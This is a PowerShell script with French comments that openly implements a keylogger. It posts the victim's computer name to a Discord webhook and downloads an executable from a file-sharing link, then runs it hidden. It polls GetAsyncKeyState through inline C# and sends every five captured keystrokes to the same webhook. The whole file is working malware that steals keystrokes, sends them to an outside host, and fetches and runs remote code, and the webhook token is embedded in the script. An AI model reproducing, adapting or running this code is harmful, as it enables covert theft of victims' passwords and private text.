$webhook = 'https://discord.com/api/webhooks/1318280027363606589/FkAnJDBzgFUo3A7YeocKsc8PbojYTWuE0-_BTNn7SunjxTokeWNOVpHk_dN9Uh5XqrOW'

# Message de démarrage
iwr $webhook -Method Post -Body (@{content="Keylogger double lancé – $env:COMPUTERNAME"}|ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing | Out-Null

# 1. Télécharge et lance ton .exe parfait (logs propres AZERTY)
iwr 'https://limewire.com/d/8fkqv#TRo9XUAhOT' -OutFile "$env:TEMP\k.exe"
Start-Process "$env:TEMP\k.exe" -WindowStyle Hidden

# 2. Keylogger brut en parallèle (comme avant, pour être sûr de rien perdre)
$code = @'
using System;
using System.Runtime.InteropServices;
public class K {
    [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int k);
}
'@

Add-Type $code

$buf = ''
while($true){
    Start-Sleep -m 30
    for($i=8;$i -le 254;$i++){
        if([K]::GetAsyncKeyState($i) -eq -32767){
            $buf += [char]$i
            if($buf.Length -ge 5){
                iwr $webhook -Method Post -Body (@{content=$buf}|ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing | Out-Null
                $buf = ''
            }
        }
    }
}
